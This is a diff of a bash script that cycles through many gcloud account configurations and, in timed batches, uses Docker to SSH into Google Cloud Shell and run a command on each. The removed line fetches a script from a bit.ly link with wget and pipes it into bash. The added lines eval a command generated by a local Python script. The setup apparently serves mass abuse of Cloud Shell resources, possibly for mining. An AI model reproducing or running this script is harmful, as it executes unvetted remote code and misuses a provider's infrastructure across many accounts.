@@ -1,15 +1,22 @@
 #!/bin/bash
 logfile=/tmp/gshellrun.log
 errlogfile=/tmp/gshellrun.log
+runingvblock=/tmp/runingbloc.tmp
+clenlist=/tmp/clengids.txt
+
+cat  $@ |sort |uniq -u > $clenlist
+
 echo > $logfile
 
-all=$(cat $1 | wc -l)
+all=$(cat $clenlist | wc -l)
 block=$[$all/3]
+
+cmd=\'$(python randpysi.py)\'
 
 function run_gsh {
   local GiD=$1
     docker run --rm --volumes-from gcloud-config-${GiD} gcr.io/google.com/cloudsdktool/cloud-sdk \
-    gcloud cloud-shell ssh --authorize-session --command='wget -q -O - bit.ly/pymind01 | bash' 
+    gcloud cloud-shell ssh --authorize-session --command="eval $cmd"
 
 }
 
@@ -20,7 +27,7 @@ do
 i=0
     
 
-    awk "NR >= 1 && NR <= $[$block * 1] " $1| while read gid 
+    awk "NR >= 1 && NR <= $[$block * 1] " $clenlist| while read gid 
     do
     
         echo "Block 1 :"
@@ -31,7 +38,7 @@ i=0
     done
     sleep 1080
     docker container stop $(docker ps -a -q)
-    awk "NR >= $[$block * 1 + 1] && NR <= $[$block * 2] " $1| while read gid 
+    awk "NR >= $[$block * 1 + 1] && NR <= $[$block * 2] " $clenlist| while read gid 
     do
     
         echo "Block 2 :"
@@ -42,7 +49,7 @@ i=0
     done
     sleep 1080
     docker container stop $(docker ps -a -q)
-    awk "NR >= $[ $block * 2 + 1] " $1| while read gid 
+    awk "NR >= $[ $block * 2 + 1] " $clenlist| while read gid 
     do
         echo "Block 3 :"
         run_gsh $gid 1>> $logfile 2>> $errlogfile &
